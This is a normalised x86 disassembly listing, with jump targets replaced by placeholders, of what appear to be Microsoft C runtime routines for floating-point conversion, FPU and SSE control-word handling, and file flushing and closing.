lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1003d191
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x18 ]
shr edi 0x10
sub edi 0x3ffe
xor eax eax
push 0x8
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x16 ] ax
mov ebx [ ebp - 0x18 ]
pop edi
mov [ ebp - 0x48 ] eax
push 0x15
pop eax
cmp edi eax
jle r-xdata
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x80 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ ecx + 0x4 ] 0x30
cmp di [ ebp - 0x70 ]
ja r-xdata
mov eax [ ebp - 0x44 ]
test eax eax
jne r-xdata
imul ecx eax 0xc
mov eax 0x8000
add ecx edi
mov [ ebp - 0x68 ] ecx
cmp [ ecx ] ax
jb r-xdata
push r--data
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003fe38
int3
mov [ ebx + 0x3 ] 0x6
mov ecx edx
mov eax esi
shr eax 0x1f
add edx edx
shr ecx 0x1f
add ebx ebx
add esi esi
or ebx ecx
or edx eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] ebx
dec edi
jne r-xdata
mov edi [ ebp - 0x64 ]
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
push 0x0
pop ebx
test edi edi
jns r-xdata
cmp di [ ebp - 0x54 ]
ja r-xdata
sar [ ebp - 0x44 ] 0x3
add edi 0x54
mov [ ebp - 0x6c ] edi
and eax 0x7
je r-xdata
mov ecx [ ebp - 0x48 ]
jmp r-xdata
movzx edi [ ecx + 0xa ]
mov esi 0x8000
mov eax [ ebp - 0x16 ]
mov [ ebp - 0x5c ] edi
and edi 0x7fff
xor [ ebp - 0x5c ] eax
and eax 0x7fff
and [ ebp - 0x5c ] esi
mov [ ebp - 0x50 ] eax
add eax edi
mov [ ebp - 0x60 ] edi
dec esi
movzx edi ax
mov eax [ ebp - 0x50 ]
cmp ax si
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4c ] edi
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x68 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
push r--data
push r--data
jmp r-xdata
mov esi [ ebp - 0x74 ]
mov eax [ ebp - 0x48 ]
inc eax
mov [ ebp - 0x54 ] eax
lea edi [ esi + 0x4 ]
mov [ ebp - 0x64 ] edi
mov ecx edi
mov [ ebp - 0x58 ] ecx
test eax eax
jle r-xdata
neg edi
and edi 0xff
jle r-xdata
test cx cx
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edi 0x3fff
shr eax 0x10
cmp ax di
jb r-xdata
xor eax eax
cmp [ ebp - 0x5c ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
mov ecx 0x7fff
cmp [ ebp - 0x60 ] cx
mov ecx [ ebp - 0x68 ]
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1003d191
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx - 0x1 ]
sub ecx 0x2
cmp al 0x35
jl r-xdata
lea esi [ ebp - 0x20 ]
mov ecx edx
lea edi [ ebp - 0x3c ]
shr ecx 0x1f
movsd [ edi ] [ esi ]
add edx edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x40 ]
mov eax edi
shr eax 0x1f
add edi edi
or edx eax
mov eax [ ebp - 0x44 ]
lea esi [ eax + eax ]
mov eax edi
or esi ecx
shr eax 0x1f
mov ecx edx
add edi edi
add edx edx
shr ecx 0x1f
or edx eax
add esi esi
mov eax [ ebp - 0x3c ]
or esi ecx
lea ecx [ eax + edi ]
mov [ ebp - 0x48 ] ecx
cmp ecx edi
jb r-xdata
mov ebx [ ebp - 0x44 ]
test ax ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
cmp di [ ebp - 0x70 ]
ja r-xdata
xor eax eax
jmp r-xdata
cmp ecx edi
jae r-xdata
jmp r-xdata
lea eax [ edx + 0x1 ]
mov ecx ebx
cmp eax edx
jb r-xdata
cmp ecx eax
jae r-xdata
mov ecx edx
shr esi 0x1
mov eax ebx
shl ecx 0x1f
shl eax 0x1f
or esi ecx
shr edx 0x1
shr ebx 0x1
or edx eax
dec edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] esi
test edi edi
jg r-xdata
mov [ ebp - 0x44 ] ebx
xor ebx ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
mov edx ebx
lea ecx [ ebp - 0xc ]
push 0x5
mov [ ebp - 0x50 ] edx
pop eax
inc edi
test [ ebp - 0x28 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
cmp di [ ebp - 0x54 ]
ja r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp ecx edi
jae r-xdata
cmp ecx edi
jae r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edi [ eax + edx ]
cmp edi edx
jb r-xdata
add ecx 0x2
inc edx
dec eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x58 ] eax
test eax eax
jg r-xdata
lea edi [ ebp - 0x20 ]
lea eax [ ebp - 0x28 ]
lea edi [ edi + edx * 2 ]
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x54 ] edi
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
test ax ax
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec ecx
mov eax [ ebp - 0x74 ]
sub cl al
sub cl 0x3
mov [ eax + 0x3 ] cl
movsx ecx cl
mov [ ecx + eax + 0x4 ] bl
xor eax eax
inc eax
mov ecx [ ebp - 0x74 ]
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x80 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ edi ] 0x30
jmp r-xdata
cmp [ ecx ] 0x39
jne r-xdata
cmp ecx edi
jae r-xdata
inc esi
test ecx ecx
mov edx eax
mov ecx [ ebp - 0x48 ]
je r-xdata
inc esi
cmp edi eax
jae r-xdata
mov esi eax
test eax eax
jle r-xdata
mov edi [ ebp - 0x4c ]
mov esi [ ebp - 0x8 ]
add edi 0xc002
test di di
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp edi edx
jae r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] edx
mov [ ecx + 0x5 ] bl
jmp r-xdata
mov [ ecx ] 0x30
dec ecx
inc [ ecx ]
inc ecx
inc [ esi ]
mov esi [ ebp - 0x74 ]
mov edi [ ebp - 0x64 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
add esi [ ebp - 0x34 ]
mov eax ecx
mov edx [ ebp - 0x48 ]
mov ecx edi
add edx edx
shr eax 0x1f
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x20 ] edx
lea edx [ edi + edi ]
or edx eax
shr ecx 0x1f
lea eax [ esi + esi ]
mov [ ebp - 0x1c ] edx
or eax ecx
mov ecx [ ebp - 0x58 ]
mov [ ebp - 0x18 ] eax
shr eax 0x18
add al 0x30
mov [ ebp - 0x15 ] bl
mov [ ecx ] al
inc ecx
mov eax [ ebp - 0x54 ]
dec eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x68 ] ebx
mov [ ecx - 0x4 ] edi
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
push 0x5
mov eax ebx
lea edx [ ebp - 0xc ]
pop esi
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x50 ] esi
inc edi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
mov cx [ ebp - 0x10 ]
mov eax edi
neg eax
movzx eax ax
add edi eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] edi
mov edi [ ebp - 0x78 ]
mov [ ebp - 0x68 ] ebx
mov edx [ ebp - 0x68 ]
push 0x0
pop ebx
test di di
jle r-xdata
mov eax [ ebp - 0xc ]
mov edx ebx
mov ecx eax
shr edx 0x1f
add eax eax
shr ecx 0x1f
or eax edx
add esi esi
mov [ ebp - 0xc ] eax
add ebx ebx
mov eax 0xffff
mov [ ebp - 0x10 ] ebx
or esi ecx
add edi eax
mov [ ebp - 0x8 ] esi
test di di
jg r-xdata
mov edi [ ebp - 0x54 ]
mov eax [ ebp - 0x70 ]
add edi 0x2
sub eax 0x2
mov [ ebp - 0x54 ] edi
dec esi
mov [ ebp - 0x70 ] eax
test esi esi
jg r-xdata
inc [ ecx ]
add edx 0x2
inc eax
dec esi
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x50 ] esi
test esi esi
jg r-xdata
lea esi [ ebp - 0x20 ]
lea eax [ esi + eax * 2 ]
lea esi [ ecx + 0x8 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x40 ] esi
mov esi [ ebp - 0x60 ]
mov ecx [ ebp - 0x40 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ebx [ ebp - 0xc ]
mov eax esi
mov ecx ebx
shl eax 0x1f
shl ecx 0x1f
shr ebx 0x1
shr edx 0x1
or ebx eax
or edx ecx
shr esi 0x1
dec [ ebp - 0x58 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc edi
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test esi esi
js r-xdata
movzx edx [ eax ]
movzx eax [ edi ]
imul edx eax
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x64 ] ebx
lea edi [ eax + edx ]
cmp edi eax
jb r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x60 ] esi
test esi esi
jle r-xdata
mov edi [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
add edi 0xc002
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x40 ] eax
test di di
jle r-xdata
xor ecx ecx
inc ecx
jmp r-xdata
cmp eax edi
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
push 0x0
test edi edi
mov [ ebp - 0x8 ] esi
mov edi [ ebp - 0x4c ]
pop ebx
je r-xdata
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test eax eax
js r-xdata
mov [ edx - 0x4 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x78 ]
mov edi [ ebp - 0x6c ]
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] esi
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov ecx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax cx
jne r-xdata
xor eax eax
mov cx dx
inc eax
or cx ax
mov [ ebp - 0x10 ] cx
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov ax [ ebp - 0x10 ]
mov ebx [ ebp - 0x40 ]
mov eax edi
neg eax
xor edx edx
movzx eax ax
add edi eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] edi
inc edx
mov edi [ ebp - 0x7c ]
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov edx esi
mov ecx eax
shr edx 0x1f
add eax eax
shr ecx 0x1f
or eax edx
add esi esi
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x10 ] esi
or eax ecx
mov ecx 0xffff
add edi ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x88 ]
mov ecx [ ebp - 0x40 ]
add eax 0x2
sub ecx 0x2
mov [ ebp - 0x88 ] eax
dec esi
mov [ ebp - 0x40 ] ecx
test esi esi
jg r-xdata
inc [ edx ]
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov eax 0x8000
inc edi
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov eax 0x8000
cmp cx ax
ja r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and esi 0x1ffff
cmp esi 0x18000
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax ebx
shl eax 0x1f
mov [ ebp - 0x40 ] ecx
shr [ ebp - 0x40 ] 0x1
or [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
shl ecx 0x1f
shr esi 0x1
shr ebx 0x1
or esi ecx
dec [ ebp - 0x50 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] esi
jne r-xdata
inc edi
movzx edi [ eax ]
movzx eax [ ecx ]
imul edi eax
mov eax [ edx - 0x4 ]
mov [ ebp - 0x78 ] ebx
lea ecx [ eax + edi ]
cmp ecx eax
mov [ ebp - 0x60 ] ecx
mov eax ecx
jb r-xdata
mov ecx [ ebp - 0x68 ]
mov esi [ ebp - 0x50 ]
mov eax [ ebp - 0x84 ]
mov esi [ ebp - 0x8 ]
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x40 ]
test [ ebp - 0x10 ] dl
je r-xdata
push 0x0
mov [ ebp - 0x40 ] ebx
test edi edi
mov edi [ ebp - 0x4c ]
pop ebx
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1a ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov edx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax dx
jne r-xdata
mov ax si
or ax dx
mov [ ebp - 0x10 ] ax
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x40 ] esi
mov eax 0x7fff
cmp di ax
jae r-xdata
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc edi
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
sub_1004a73b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_1004a7e4
push ebp
mov ebp esp
sub esp 0xc
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov ebx 0xc00
mov edx esi
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov esi edi
mov eax [ ebp + 0x8 ]
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
movzx eax ax
mov edx 0x1000
test edx eax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_1004aae6
movzx eax ax
pop ecx
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test edx eax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
or ecx esi
xor eax esi
test eax 0x8031f
je r-xdata
push eax
call sub_1004a73b
push eax
mov [ ebp + 0xc ] eax
call sub_1003faec
pop ecx
pop ecx
stmxcsr [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_1004aae6
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1004ab7d
push 0x14
push r--data
call sub_1003f180
xor esi esi
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_100417ee
mov [ eax ] 0x9
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_1003fe28
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_100487ba
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_100417ee
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_100488ce
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_1003f1c5
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004ac45
mov eax esi
jmp r-xdata
call sub_100417ba
mov [ eax ] esi
sub_1004ac66
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_100483c1
push esi
mov edi eax
call sub_1004b0d4
push esi
call sub_100460c6
push eax
call sub_1004af5f
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_1003f3e3
and [ esi + 0x1c ] 0x0
pop ecx
sub_1004acd2
push 0xc
push r--data
call sub_1003f180
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
push esi
call sub_10045ff0
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1004ac66
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004ad41
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_1003f1c5
retn
sub_1004ad7f
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
mov eax 0x404e
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
mov ecx edx
mov [ ebp + 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov edx [ ebx + 0x8 ]
test edx 0x8000
jne r-xdata
mov edx [ ebx + 0x4 ]
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x1c ]
jae r-xdata
pop edi
pop esi
mov [ ebx + 0xa ] ax
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
mov ecx [ ebx ]
mov esi edx
mov eax ecx
shl edx 0x10
shr eax 0x10
or edx eax
shr esi 0x10
mov eax [ ebp - 0x4 ]
shl ecx 0x10
add eax 0xfff0
mov [ ebx ] ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] esi
mov edx [ ebp - 0x18 ]
xor eax eax
lea ecx [ esi + edx ]
mov [ ebp - 0xc ] ecx
cmp ecx esi
jb r-xdata
mov eax esi
xor ecx ecx
lea esi [ eax + 0x1 ]
cmp esi eax
jb r-xdata
mov [ ebx ] eax
test ecx ecx
je r-xdata
mov eax edi
mov ecx esi
shr eax 0x1f
add esi esi
or esi eax
shr ecx 0x1f
mov eax [ ebp - 0x4 ]
add edx edx
or edx ecx
add eax 0xffff
add edi edi
mov [ ebp - 0x4 ] eax
test edx 0x8000
je r-xdata
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edx
xor eax eax
inc eax
cmp ecx edx
jae r-xdata
xor ecx ecx
inc ecx
cmp esi 0x1
jae r-xdata
mov edx [ ebp + 0x10 ]
mov eax edx
mov esi [ ebp - 0xc ]
add edx edx
add edi [ ebp - 0x14 ]
add esi esi
and [ ebp - 0x10 ] 0x0
add edi edi
shr eax 0x1f
or esi eax
shr ecx 0x1f
mov eax [ ebp + 0x8 ]
or edi ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edi
movsx eax [ eax ]
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1c ] eax
lea ecx [ edx + eax ]
mov [ ebp - 0xc ] ecx
cmp ecx edx
jb r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] ecx
test eax eax
je r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] esi
test ecx ecx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp ecx eax
jae r-xdata
mov [ ebx ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
dec eax
mov [ ebx + 0x4 ] esi
inc [ ebp + 0x8 ]
mov [ ebx + 0x8 ] edi
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
mov eax esi
xor edx edx
lea esi [ eax + 0x1 ]
mov [ ebp + 0x10 ] esi
cmp esi eax
jb r-xdata
mov edx [ ebp - 0xc ]
lea edi [ ebp - 0x1c ]
mov esi ebx
mov eax ecx
shr eax 0x1f
add edx edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov ecx esi
mov edi [ ebp - 0x8 ]
add esi esi
or esi eax
shr ecx 0x1f
add edi edi
mov eax edx
or edi ecx
shr eax 0x1f
mov ecx esi
add edx edx
add esi esi
shr ecx 0x1f
or esi eax
mov [ ebx ] edx
mov eax [ ebp - 0x1c ]
add edi edi
or edi ecx
mov [ ebx + 0x4 ] esi
add eax edx
mov [ ebx + 0x8 ] edi
xor ecx ecx
mov [ ebp + 0x10 ] eax
cmp eax edx
jb r-xdata
mov eax 0x404e
xor edx edx
xor edx edx
inc edx
cmp esi 0x1
jae r-xdata
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] esi
test edx edx
je r-xdata
sub_1004af5f
push 0x10
push r--data
call sub_1003f180
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_100417ba
